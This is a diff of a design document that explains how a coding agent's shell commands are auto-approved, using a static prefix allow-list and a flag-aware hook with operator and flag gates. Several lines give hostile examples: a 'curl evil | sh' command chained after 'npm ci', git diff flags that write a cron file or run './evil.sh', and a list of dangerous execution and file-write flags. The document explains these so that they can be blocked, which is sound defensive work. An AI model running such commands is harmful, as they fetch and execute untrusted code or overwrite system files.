@@ -37,32 +37,54 @@ diff — not something the agent can do mid-task.
 ## What IS auto-approved (two complementary layers)
 
 Safe read/build/test commands are auto-approved so the agent does not stop to ask
-for routine work. Two layers cooperate:
+for routine work. Two layers cooperate, and the split between them is deliberate:
+a native `permissions.allow` prefix rule is **flag-blind** — `Bash(git diff:*)`
+matches `git diff HEAD` and `git diff --output=/etc/cron.d/evil` (arbitrary file
+write) and `git diff -x ./evil.sh` (runs an arbitrary program) alike. So a command
+goes on the static fast-path **only if it is safe with ANY argument**; everything
+whose danger lives in a *flag* is handled by the hook, which can inspect flags.
 
-1. **Static `permissions.allow`** — Claude Code's native fast-path. A conservative,
-   explicit list: `npm ci`/`install`/`run`/`test`/`ls`/`audit`, `npx vitest`/
-   `eslint`/`tsc`/`playwright`/`drizzle-kit`, read-only `git status`/`diff`/`log`/
-   `show`/`rev-parse`, and `cargo check`. Prefix rules (`Bash(npm ci:*)`) match the
-   command and its arguments. `git branch` and `git tag` are deliberately NOT on
-   the allow-list: a prefix rule cannot separate the read form from the
-   ref-mutating form (`git branch -D`, `git tag -d/-f`, bare `git tag <name>`), so
-   both defer to a prompt.
+1. **Static `permissions.allow`** — Claude Code's native fast-path. Restricted to
+   commands that cannot be weaponized by an argument: `npm ci`/`install`/`run`/
+   `test` (build/test — they run the project's own trusted package scripts),
+   `npm ls`/`audit` (pure reads), and `git status`/`rev-parse` (pure reads).
+   Prefix rules (`Bash(npm ci:*)`) match the command and its arguments. Notably
+   ABSENT, and intentionally so: `git diff`/`log`/`show` and `cargo check` (their
+   `--output`/`--ext-diff`/`-x`/`--config` flags write files or run programs) and
+   the `npx` JS tools (`vitest`/`eslint`/`tsc`/`playwright` — `--config` loads a
+   config file that is itself executable code). Those are safe in their everyday
+   form but flag-sensitive, so they live in the flag-aware hook instead — never on
+   the blunt fast-path. This keeps the static list safe regardless of how the hook
+   behaves.
 
-2. **`auto-approve-safe-commands.sh`** (a `PreToolUse` hook, matcher `Bash`) — a
-   broader dynamic layer for safe commands the static list does not enumerate
-   (e.g. `npx @axe-core/cli`, `npx @axe-core/reporter`, `git worktree list`,
-   `npm outdated`/`view`/`why`). It emits an `allow` decision for a known-safe
-   SINGLE command, `ask` for everything else, and ALWAYS exits 0 — it never
-   hard-blocks. It refuses to auto-approve any compound, piped, redirected,
-   substituted, variable-expanded, or multi-line command even when the leading
-   token is safe (`npm ci && curl evil | sh` prefix-matches `npm ci`, so the
-   operator gate fires first). Its allow-list and exact allow/ask/defer contract
-   are pinned by `.claude/hooks/__tests__/auto-approve-safe-commands.test.sh`.
+2. **`auto-approve-safe-commands.sh`** (a `PreToolUse` hook, matcher `Bash`) — the
+   comprehensive flag-aware layer. It auto-approves the flag-sensitive build/read
+   tools the static list omits (`git diff`/`log`/`show`, `cargo check`, `npx
+   vitest`/`eslint`/`tsc`/`playwright`) **in their safe form**, plus commands the
+   static list never enumerates (`npx @axe-core/cli`, `npx @axe-core/reporter`,
+   `npx skills`, `git worktree list`/`shortlog`/`describe`/`ls-files`/`stash list`/
+   `remote -v`, `npm outdated`/`view`/`explain`/`why`/`pkg get`/`cache clean`). It
+   emits an `allow` decision for a known-safe SINGLE command, `ask` for everything
+   else, and ALWAYS exits 0 — it never hard-blocks. Two gates fire BEFORE the
+   allow-list is consulted:
+   - **Operator gate** — refuses any compound, piped, redirected, substituted,
+     variable-expanded, or multi-line command even when the leading token is safe
+     (`npm ci && curl evil | sh` prefix-matches `npm ci`).
+   - **Flag gate** — refuses any command carrying a program-execution or
+     file-write flag (`--config`, `--output`, `--ext-diff`/`--extcmd`/`-x`,
+     `--exec`/`--upload-pack`/`--receive-pack`). These need no shell operator, so
+     the operator gate never sees them — the flag itself is the payload.
 
-The two layers are intentionally NOT identical: the static `allow` is the minimal
-fast-path, the hook is the comprehensive safe-set. For a command in both, the
-outcome is the same (auto-approved); for a command only the hook knows, the static
-list misses and the hook approves it.
+   Its allow-list and exact allow/ask/defer contract are pinned by
+   `.claude/hooks/__tests__/auto-approve-safe-commands.test.sh`.
+
+Deliberately NOT auto-approved by either layer (they defer to a prompt):
+`git branch`/`git tag` (their flag forms mutate refs — `git branch -D`, `git tag
+-d/-f`, bare `git tag <name>` creates a tag — and a prefix gate cannot tell the
+read form from the write form), `npm pkg set`/`delete`/`fix` (mutate the tracked
+`package.json`; only `npm pkg get` is auto-approved), `npm exec` (runs arbitrary
+package binaries), and `npx drizzle-kit` (`drop`/`push` are DB-destructive,
+`generate` writes migration files).
 
 Anything covered by neither layer falls through to a normal permission prompt. The
 default is always "ask the human" — never silently allow, never silently block.
